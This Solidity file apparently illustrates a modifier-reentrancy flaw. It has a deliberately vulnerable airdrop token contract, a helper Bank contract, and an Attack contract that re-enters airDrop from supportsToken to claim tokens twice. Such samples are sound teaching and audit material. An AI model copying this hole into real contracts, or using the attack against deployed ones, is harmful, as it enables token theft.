pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";
    Bank public bank;

    constructor(address _bankAddress) public {
        bank = Bank(_bankAddress);
    }

    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(bank.supportsToken() == keccak256(abi.encodePacked(name)));
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return keccak256(abi.encodePacked("Nu Token"));
    }
}

contract Attack {
    bool hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }

    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}